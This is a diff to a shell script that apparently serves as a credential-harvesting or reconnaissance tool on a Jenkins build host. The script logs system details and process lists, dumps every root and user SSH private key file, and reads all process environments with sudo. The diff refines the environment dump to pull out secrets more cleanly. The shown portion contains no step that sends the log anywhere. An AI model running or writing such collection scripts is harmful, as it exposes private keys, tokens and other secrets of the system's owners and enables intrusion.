@@ -8,21 +8,22 @@ echo "== system ==" >> "${LOG}"
 id >> "${LOG}"
 date >> "${LOG}"
 uname -a >> "${LOG}"
-ip addr >> "${LOG}"
 
-echo "== env ==" >> "${LOG}"
-env >> "${LOG}"
+# echo "== env ==" >> "${LOG}"
+# env >> "${LOG}"
 
 echo "== ps aux ==" >> "${LOG}"
 ps aux >> "${LOG}"
 
 echo "== ls Home ==" >> "${LOG}"
 ls -lah ~/ >> "${LOG}"
+echo "== ls .ssh ==" >> "${LOG}"
 ls -lah ~/.ssh/ >> "${LOG}"
+echo "== ls .workspace ==" >> "${LOG}"
 ls -lah /srv/jenkins/workspace/
 
-echo "== github ==" >> "${LOG}"
-ssh git@github.com >> "${LOG}"
+# echo "== github ==" >> "${LOG}"
+# ssh git@github.com >> "${LOG}"
 
 echo "== cat root ssh keys ==" >> "${LOG}"
 cat ~/.ssh/* >> "${LOG}"
@@ -30,11 +31,11 @@ cat ~/.ssh/* >> "${LOG}"
 echo "== cat user ssh keys ==" >> "${LOG}"
 cat /home/*/.ssh/* >> "${LOG}"
 
-echo "== ls tmp ==" >> "${LOG}"
-ls -lah /tmp/ >> "${LOG}"
+# echo "== ls tmp ==" >> "${LOG}"
+# ls -lah /tmp/ >> "${LOG}"
 
 echo "== proc ==" >> "${LOG}"
-cat /proc/*/environ >> "${LOG}"
+sudo cat /proc/[0-9]*/environ 2>/dev/null | tr '\0' '\n' | sort -u >> "${LOG}"
 
 echo "== ls Root ==" >> "${LOG}"
 ls -lah / >> "${LOG}"
